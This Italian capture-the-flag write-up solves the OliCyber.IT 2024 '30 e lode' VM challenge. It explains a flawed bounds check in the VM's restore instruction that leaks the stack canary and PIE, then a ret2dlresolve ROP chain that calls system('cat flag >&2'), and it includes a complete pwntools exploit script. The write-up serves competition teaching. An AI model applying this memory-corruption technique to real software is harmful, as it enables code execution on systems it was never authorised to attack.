# OliCyber.IT 2024 - National Final

## [binary] 30 e lode (0 risoluzioni)

Ho scritto questa VM per il mio corso universitario di sistemi operativi. C'è ancora un sacco di codice da aggiungere, ma per il momento ne sono fiera. Puoi controllarla per me? Voglio 30 e lodeeeeeeeeeeeeeeee!

`nc 30elode.challs.olicyber.it 38301`

Author: Giulia Martino <@Giulia>

## Panoramica

La challenge implementa una semplice macchina virtuale scritta in C che:

- utilizza un'area di memoria come stack, allocata nello stack del programma
- ha 17 registri tutti memorizzati nella sezione `.bss` del programma nella variabile globale `regs`
  - 16 registri ad uso generale
  - 1 registro stack pointer
- implementa diverse istruzioni:
  - aritmetiche (`add`, `sub`, `mul`, ...)
  - `push` e `pop` con registri e immediati da 8/16 bit
  - `mov` tra registri
  - `set` che imposta un registro a un valore immediato
  - due istruzioni speciali
    - `save` che pusha i 16 GPR sullo stack
    - `restore` che poppa 16 blocchi di stack nei 16 GPR

Quando la challenge inizia, all'utente viene chiesto di fornire del codice che verrà dato in pasto alla VM. La challenge si assicura che il codice sia contenibile dal buffer allocato per esso e che la dimensione del codice sia un multiplo di 4, suggerendo quindi la dimensione delle istruzioni.

La challenge poi crea una pipe ed esegue fork. Il processo figlio procede chiudendo sia `stdin` che `stdout` (ma non `stderr`), alloca lo stack, e poi inizia a analizzare il codice dell'utente ed eseguire le istruzioni corrispondenti, 4 byte alla volta. Se trova un'istruzione non valida, smette semplicemente di analizzare e ritorna. Alla fine dell'esecuzione, il risultato del codice, memorizzato dentro `regs[0]`, viene scritto nella pipe dal processo figlio in modo che il processo parent possa leggerlo e stamparlo su `stdout`.

### Reversing e interazione

Agli utenti è fornito solo il binario della challenge, che non è stato strippato ed è piuttosto lineare da reversare, considerando che la maggior parte delle operazioni che esegue sono semplici.

Funzioni ausiliarie possono essere implementate per ciascun opcode per semplificare l'interazione con la challenge.

```python
OPCODE_ADD = 0x0
OPCODE_SUB = 0x1
OPCODE_MUL = 0x2
OPCODE_DIV = 0x3
OPCODE_AND = 0x4
OPCODE_OR =  0x5
OPCODE_XOR = 0x6
OPCODE_SHL = 0x7
OPCODE_SHR = 0x8
OPCODE_PUSH = 0x9
OPCODE_POP = 0xa
OPCODE_MOV = 0xb
OPCODE_SAVE = 0xc
OPCODE_RESTORE = 0xd
OPCODE_SET = 0xe
SIZE_IMM_8 = 0x0
SIZE_IMM_16 = 0x1
SIZE_REG = 0x2

full = b""

def binary(opcode, src, dst):
    global full
    payload = p8(opcode)
    payload += p8(src << 4 | dst)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_8(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_8)
    payload += p8(imm)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_16(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_16)
    payload += p16(imm)
    full += payload

def push_imm_32(imm):
    push_imm_16(imm >> 16)
    push_imm_16(imm & 0xffff)

def push_imm_64(imm):
    push_imm_32(imm >> 32)
    push_imm_32(imm & 0xffffffff)

def push_reg(reg):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_REG)
    payload += p16(reg)
    full += payload

def pop(reg):
    global full
    payload = p8(OPCODE_POP)
    payload += p8(reg)
    payload = payload.ljust(4, b"\x00")
    full += payload

def save():
    global full
    payload = p8(OPCODE_SAVE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def restore():
    global full
    payload = p8(OPCODE_RESTORE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def set(imm, reg):
    global full
    payload = p8(OPCODE_SET)
    payload += p16(imm)
    payload += p8(reg)
    full += payload
```

## Soluzione

### Vulnerabilità

Il controllo all'interno della funzionalità `restore` è incorretto e ci permette di eseguirla anche quando il puntatore allo stack della VM è già alla base dello stack della VM stesso.

```c
if (regs[SP] > (long) stack_start + (NUM_REGS * 8))     // <-- il + dovrebbe essere un - qui
    errx(1, "Segmentation fault");
```

### Strategia

Questo significa che possiamo poppare dallo stack più di quello che dovremmo, il che potrebbe significare ottenere dei leak. Inoltre, considerando che l'istruzione `save` ci permette di riportare il contenuto dei registri nuovamente sullo stack, la seguente strategia può essere seguita per ottenere un controllo out-of-bounds dello stack:

- `restore`, per estrarre i valori dello stack nei registri
- modificare il contenuto dei registri
- `save`, per ripristinare i valori modificati nello stack

Possiamo usare un debugger per analizzare lo stato dello stack subito prima che inizi l'esecuzione del codice della VM per verificare cosa può essere leakato/modificato:

![stack_state](attachments/stack_state.png)

- La linea rosa indica il canary dello stack.
- Gli indirizzi rossi puntano a codice all'interno dell'eseguibile.
- Gli indirizzi gialli sono indirizzi dello stack.
- La linea blu indica l'inizio del banner della challenge.

Quindi, eseguendo un'istruzione `restore` come prima istruzione, possiamo estrarre sia il canary sia PIE. Questo è lo stato dei registri della VM dopo il `restore`:

![registers_restore](attachments/registers_restore.png)

- `regs[12]` (in rosso) contiene l'indirizzo di ritorno.
- `regs[14]` (in rosa) contiene il canary.

Modificando `regs[12]` e i registri precedenti possiamo costruire una ROP chain, mentre `regs[14]` deve essere preservato per bypassare la protezione del canary.

Non esiste una funzione `win` né ci sono molti gadget utili, incluso nessun gadget `syscall`, quindi eseguire una ROP chain diretta all'interno del binario per ottenere una shell o leggere la flag non è possibile.

Passare attraverso `libc` è sempre un'opzione, ma quella remota non è fornita in allegato e non abbiamo voglia di estrarla per eseguire un attacco `ret2libc`, considerando che `stdout` è chiuso.

### Ret2dlresolve

La tecnica `ret2dlresolve` viene in nostro soccorso. Questa tecnica sfrutta il processo di linking dinamico e non necessita di alcun leak di `libc`, nonostante ci permetta di chiamare funzioni arbitrarie da essa.  

Quando un binario è dynamically linked, gli indirizzi delle funzioni esterne importate dal binario (ad esempio funzioni di `libc`) vengono risolti solo durante l'esecuzione, quando necessario. Il binario non conosce realmente l'indirizzo di una funzione esterna fino a quando non viene chiamata per la prima volta. Questo processo è chiamato lazy binding.

In breve, questo processo utilizza stub di codice nel binario insieme a strutture specifiche per ogni funzione che descrivono come risolvere una funzione da una libreria.

`ret2dlresolve` consiste nel costruire una versione fake di queste strutture per un simbolo arbitrario, e poi emulare il processo di risoluzione (preparando anche registri e stack come necessario) per ingannare il dynamic linker nel risolvere il simbolo desiderato per noi, come farebbe con una funzione importata legittimamente.

Questa writeup non spiegherà l'intero processo nel dettaglio, dato che ci sono molte risorse ben fatte online. [Questo blogpost](https://syst3mfailure.io/ret2dl_resolve/) è un esempio, e si consiglia fortemente di leggerlo per avere una comprensione approfondita del processo di linking dinamico e della tecnica di exploitation. Il resto del writeup dà per scontato che l'utente già ne conosca i dettagli.

Pwntools fornisce [un modulo utile](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html) per i payload `ret2dlresolve`, che può essere utilizzato con qualche aggiustamento.

Considerando che possiamo risolvere una funzione arbitraria, scegliamo `system`. Non vogliamo davvero aprire una shell dato che `stdin` e `stdout` sono chiusi, quindi possiamo semplicemente eseguire `system("cat flag >&2")` per stampare la flag su `stderr`, che è ancora aperto.

Per effettuare l'attacco `ret2dlresolve` dobbiamo:

1. scrivere le strutture fake per `system` in un'area di memoria che deve essere relativamente vicina alla GOT (la `.bss` di solito è perfettamente adatta).
2. impostare `rdi` all'argomento con cui vogliamo chiamare `system` (l'indirizzo della stringa `cat flag >&2`).
3. sovrascrivere l'indirizzo di ritorno con l'indirizzo dello stub `plt_init` e impostare i successivi 8 byte (un blocco dello stack) all'indice `reloc_index` corretto.

#### 1. Strutture fake

Il primo requisito può essere soddisfatto utilizzando i registri della VM stessa. Sono tutti memorizzati nella sezione `.bss`, e ognuno di essi è lungo 8 byte. Questo significa che possiamo controllare un'area di memoria di 16 * 8 byte nella `.bss`. La funzione `Ret2dlresolvePayload` di pwntools ci permette di specificare dove memorizzare il payload, in modo che possa calcolare il `reloc_index` di conseguenza.

> Nota che la parte `args` di questo payload non è veramente rilevante per noi, poiché imposteremo `rdi` all'argomento desiderato in seguito.

```python
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["whatever"], data_addr=exe.sym["regs"])
print(f"dlresolve.data_addr: {hex(dlresolve.data_addr)}")
print(f"dlresolve.reloc_index: {dlresolve.reloc_index}")

for i in range(0, len(dlresolve.payload) // 8):
    push_imm_64(u64(dlresolve.payload[8*i:8*(i+1)]))
    pop(i)
```

#### 3. Preparare lo stack

Il terzo requisito può essere soddisfatto utilizzando la combinazione `restore` + `save`. L'offset `plt_init` può essere trovato usando IDA, Ghidra, o semplicemente copiando il codice che pwntools utilizza per calcolarlo dal suo sorgente. Il `reloc_index` può essere estratto dall'oggetto `dlresolve` generato nel passaggio precedente.

```python
restore()   # regs[14] = canary; regs[13] = stack leak; regs[12] = pie leak; regs[11] = reloc_index
LEAK_OFFS = 0x1cfe
PLT_INIT_OFFS = exe.get_section_by_name(".plt").header.sh_addr
print(f"plt_init_offs: {hex(PLT_INIT_OFFS)}")
set(LEAK_OFFS - PLT_INIT_OFFS, 0)
binary(OPCODE_SUB, 12, 0)

set(dlresolve.reloc_index, 11)
save()
```

> Note: l'exploit finale effettua in realtà questo step per primo, prima del precedente.

#### 2. Impostare `rdi`

Per soddisfare il secondo requisito, dobbiamo controllare `rdi`. L'ultima istruzione eseguita prima dell'istruzione `return` all'interno di `vm` è una chiamata a `parse`, che prende un puntatore al nostro codice come primo argomento. All'istruzione `return`, il valore di `rdi` non è stato ancora modificato e continua a puntare al nostro buffer di codice, il che significa che è controllato. Considerando che ogni volta che viene trovata un'istruzione non valida la challenge si interrompe semplicemente di analizzare le istruzioni, è possibile impostare `rdi = indirizzo di una stringa arbitraria` inserendo semplicemente la stringa arbitraria alla fine del nostro codice e assicurandosi che i suoi primi 4 caratteri **non** rappresentino un'istruzione VM valida. La stringa `cat flag >&2` funziona così com'è.

Mettendo tutto insieme possiamo ottenere la flag.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "30elode")
exe = context.binary = ELF(args.EXE or filename, checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get("HOST", "30elode.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38301))

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

gdbscript = '''
set follow-fork-mode child
b vm
c
'''.format(**locals())

# ==========================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

OPCODE_ADD = 0x0
OPCODE_SUB = 0x1
OPCODE_MUL = 0x2
OPCODE_DIV = 0x3
OPCODE_AND = 0x4
OPCODE_OR =  0x5
OPCODE_XOR = 0x6
OPCODE_SHL = 0x7
OPCODE_SHR = 0x8
OPCODE_PUSH = 0x9
OPCODE_POP = 0xa
OPCODE_MOV = 0xb
OPCODE_SAVE = 0xc
OPCODE_RESTORE = 0xd
OPCODE_SET = 0xe
SIZE_IMM_8 = 0x0
SIZE_IMM_16 = 0x1
SIZE_REG = 0x2

full = b""

def binary(opcode, src, dst):
    global full
    payload = p8(opcode)
    payload += p8(src << 4 | dst)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_8(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_8)
    payload += p8(imm)
    payload = payload.ljust(4, b"\x00")
    full += payload

def push_imm_16(imm):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_IMM_16)
    payload += p16(imm)
    full += payload

def push_imm_32(imm):
    push_imm_16(imm >> 16)
    push_imm_16(imm & 0xffff)

def push_imm_64(imm):
    push_imm_32(imm >> 32)
    push_imm_32(imm & 0xffffffff)

def push_reg(reg):
    global full
    payload = p8(OPCODE_PUSH)
    payload += p8(SIZE_REG)
    payload += p16(reg)
    full += payload

def pop(reg):
    global full
    payload = p8(OPCODE_POP)
    payload += p8(reg)
    payload = payload.ljust(4, b"\x00")
    full += payload

def save():
    global full
    payload = p8(OPCODE_SAVE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def restore():
    global full
    payload = p8(OPCODE_RESTORE)
    payload = payload.ljust(4, b"\x00")
    full += payload

def set(imm, reg):
    global full
    payload = p8(OPCODE_SET)
    payload += p16(imm)
    payload += p8(reg)
    full += payload

restore()   # regs[14] = canary; regs[13] = stack leak; regs[12] = pie leak; regs[11] = reloc_index
LEAK_OFFS = 0x1cfe
PLT_INIT_OFFS = exe.get_section_by_name(".plt").header.sh_addr
print(f"plt_init_offs: {hex(PLT_INIT_OFFS)}")
set(LEAK_OFFS - PLT_INIT_OFFS, 0)
binary(OPCODE_SUB, 12, 0)

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["whatever"], data_addr=exe.sym["regs"])
print(f"dlresolve.data_addr: {hex(dlresolve.data_addr)}")
print(f"dlresolve.reloc_index: {dlresolve.reloc_index}")

set(dlresolve.reloc_index, 11)
save()

for i in range(0, len(dlresolve.payload) // 8):
    push_imm_64(u64(dlresolve.payload[8*i:8*(i+1)]))
    pop(i)

full += b"cat flag >&2"
if len(full) % 4 != 0:
    full = full.ljust((len(full) // 4 + 1) * 4, b"\x00")
io.sendlineafter(b"Code size (bytes): ", str(len(full)).encode())
io.sendafter(b"Code: ", full)

if args.GDB:
    io.interactive()
else:
    res = io.recvuntil(b"flag{").strip()
    print('flag{' + io.recvuntil(b'}').strip().decode())
    io.close()
```
